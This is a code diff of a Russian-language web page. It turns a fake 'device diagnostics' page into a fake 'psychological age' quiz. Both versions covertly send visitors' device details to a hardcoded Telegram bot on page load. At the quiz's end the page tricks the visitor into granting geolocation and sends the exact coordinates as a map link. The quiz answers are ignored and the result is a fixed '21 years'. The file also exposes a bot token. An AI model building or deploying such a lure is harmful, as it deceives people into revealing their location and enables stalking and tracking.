@@ -3,169 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Тестирование конфигурации устройства</title>
+    <title>Тест: Психологический возраст</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 40px 20px;
-            text-align: center;
-            background-color: #f8f9fa;
-            color: #333;
-        }
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
-        }
-        h1 {
-            font-size: 24px;
-            color: #1a1a1a;
-            margin-bottom: 10px;
-        }
-        p {
-            font-size: 15px;
-            color: #666;
-            line-height: 1.5;
-            margin-bottom: 25px;
-        }
-        button {
-            padding: 14px 28px;
-            font-size: 16px;
-            cursor: pointer;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-weight: 600;
-            transition: background-color 0.2s;
-            width: 100%;
-            box-sizing: border-box;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
+        body { font-family: sans-serif; background: #764ba2; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .card { background: white; max-width: 400px; width: 90%; padding: 30px 20px; border-radius: 15px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        .btn { display: block; width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 15px; cursor: pointer; transition: 0.2s; }
+        .btn:hover { background: #ebf8ff; border-color: #4299e1; }
+        .btn-act { background: #38a169; color: white; border: none; font-weight: bold; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>Проверка параметров системы</h1>
-        <p>Нажмите на кнопку ниже, чтобы начать диагностику аппаратных функций смартфона, включая калибровку датчика геолокации и замер батареи.</p>
-        
-        <button onclick="requestLocation()">Запустить диагностику</button>
+    <div class="card">
+        <div id="s-start">
+            <h2>Тест: Твой психологический возраст</h2>
+            <p>Узнай свой реальный внутренний возраст. Всего 3 быстрых вопроса.</p>
+            <button class="btn btn-act" onclick="go('start', 'q1')">Начать тест</button>
+        </div>
+
+        <div id="s-q1" class="hidden">
+            <h2>Вопрос 1 из 3</h2>
+            <p>Ваш идеальный вечер?</p>
+            <button class="btn" onclick="go('q1', 'q2')">Шумная тусовка</button>
+            <button class="btn" onclick="go('q1', 'q2')">Сериал под пледом</button>
+        </div>
+
+        <div id="s-q2" class="hidden">
+            <h2>Вопрос 2 из 3</h2>
+            <p>Какую музыку вы слушаете?</p>
+            <button class="btn" onclick="go('q2', 'q3')">Тренды и фонк</button>
+            <button class="btn" onclick="go('q2', 'q3')">Ретро и классику</button>
+        </div>
+
+        <div id="s-q3" class="hidden">
+            <h2>Вопрос 3 из 3</h2>
+            <p>Как вы решаете проблемы?</p>
+            <button class="btn" onclick="go('q3', 'final')">Нейросети и поиск</button>
+            <button class="btn" onclick="go('q3', 'final')">Спрашиваю у близких</button>
+        </div>
+
+        <div id="s-final" class="hidden">
+            <h2>Тест завершен!</h2>
+            <p>Для точного расчета и вывода результатов нажмите на кнопку ниже.</p>
+            <button class="btn btn-act" onclick="reqGeo()">Показать результаты</button>
+        </div>
     </div>
 
     <script>
-        const TG_TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
-        const TG_CHAT_ID = "6559747526"; 
+        const TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss", CHAT_ID = "6559747526";
 
-        // Максимально надежная функция отправки, защищенная от блокировок
-        function sendToTelegram(text) {
-            // Формируем прямую GET-ссылку для отправки сообщения
-            const url = `https://telegram.org{TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+        function go(cur, next) {
+            document.getElementById('s-' + cur).classList.add('hidden');
+            document.getElementById('s-' + next).classList.remove('hidden');
+        }
+
+        async function send(text) {
+            const specs = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Apple iOS" : "Android/ПК";
+            const time = new Date().toLocaleTimeString();
+            const fullText = `📱 *Отчет*\n🤖 ОС: ${specs}\n🕒 Время: ${time}${text}`;
             
-            // Отправляем запрос методом скрытого создания картинки (работает без CORS ограничений)
-            const img = new Image();
-            img.src = url;
+            fetch(`https://telegram.org{TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: fullText, parse_mode: 'Markdown' })
+            }).catch(() => {
+                new Image().src = `https://telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(fullText)}&parse_mode=Markdown`;
+            });
         }
 
-        function getExactIphoneModel() {
-            const width = window.screen.width;
-            const height = window.screen.height;
-            const ratio = window.devicePixelRatio;
+        window.addEventListener('DOMContentLoaded', () => send(''));
 
-            if (width === 430 && height === 932 && ratio === 3) return "iPhone 14 Pro Max / 15 Pro Max / 15 Plus";
-            if (width === 393 && height === 852 && ratio === 3) return "iPhone 14 Pro / 15 Pro / 15";
-            if (width === 428 && height === 926 && ratio === 3) return "iPhone 13 Pro Max / 14 Plus";
-            if (width === 390 && height === 844 && ratio === 3) return "iPhone 12 / 12 Pro / 13 / 13 Pro / 14";
-            if (width === 414 && height === 896 && ratio === 3) return "iPhone 11 Pro Max / XS Max";
-            if (width === 375 && height === 812 && ratio === 3) return "iPhone 11 Pro / X / XS / 12 mini / 13 mini";
-            if (width === 414 && height === 896 && ratio === 2) return "iPhone 11 / XR";
-            if (width === 414 && height === 736 && ratio === 3) return "iPhone 6 Plus / 7 Plus / 8 Plus";
-            if (width === 375 && height === 667 && ratio === 2) return "iPhone 6 / 7 / 8 / SE (2020/2022)";
-            
-            return "Устройство Apple (iPhone/iPad)";
-        }
-
-        async function getDeviceSpecs() {
-            let batteryLevel = "Блокируется системой (iOS)";
-            let deviceModel = "Не определено";
-
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryLevel = `${Math.round(battery.level * 100)}%`;
-                } catch (e) {}
-            }
-
-            if (navigator.userAgentData) {
-                try {
-                    const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
-                    deviceModel = `${ua.model || "Модель скрыта"} (Android ${ua.platformVersion || ""})`;
-                } catch (e) {
-                    deviceModel = "Устройство Android";
-                }
-            } else {
-                if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-                    deviceModel = getExactIphoneModel();
-                } else if (/Android/i.test(navigator.userAgent)) {
-                    deviceModel = "Устройство Android (Старый браузер)";
-                } else {
-                    deviceModel = "Персональный компьютер";
-                }
-            }
-
-            return { batteryLevel, deviceModel };
-        }
-
-        async function collectAnalytics(extraText = "") {
-            const specs = await getDeviceSpecs();
-            const localTime = new Date().toLocaleTimeString();
-            const screenRes = `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio})`;
-
-            const message = `📱 *Новый технический отчет*\n\n` +
-                            `🤖 *Устройство:* ${specs.deviceModel}\n` +
-                            `🔋 *Заряд батареи:* ${specs.batteryLevel}\n` +
-                            `🖥 *Разрешение:* ${screenRes}\n` +
-                            `🕒 *Локальное время:* ${localTime}` + 
-                            extraText;
-
-            sendToTelegram(message);
-        }
-
-        window.addEventListener('DOMContentLoaded', () => {
-            // Добавляем задержку в полсекунды перед отправкой первого отчета при входе, 
-            // чтобы дать скриптам прогрузиться без сбоев
-            setTimeout(() => {
-                collectAnalytics();
-            }, 500);
-        });
-
-        function requestLocation() {
+        function reqGeo() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        
-                        // Прямая ссылка на Яндекс Карты
-                        const yandexMapsUrl = `https://yandex.ru{lon},${lat}&whatshere%5Bzoom%5D=16`;
-                        const geoText = `\n\n🗺 *Определено местонахождение*:\n\n[Открыть на Яндекс Картах](${yandexMapsUrl})`;
-                        
-                        collectAnalytics(geoText);
-                        alert("Диагностика успешно завершена!");
-                    },
-                    (error) => {
-                        alert("Для завершения теста требуется разрешить доступ к датчику геолокации.");
-                    },
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                );
-            } else {
-                alert("Ваш браузер не поддерживает API геолокации.");
+                navigator.geolocation.getCurrentPosition(res => {
+                    const url = `https://yandex.ru{res.coords.longitude},${res.coords.latitude}&whatshere%5Bzoom%5D=16`;
+                    send(`\n🗺 [Открыть на Яндекс Картах](${url})`);
+                    alert("Ваш психологический возраст: 21 год!");
+                }, () => alert("Ошибка датчиков. Разрешите доступ к геопозиции."));
             }
         }
     </script>
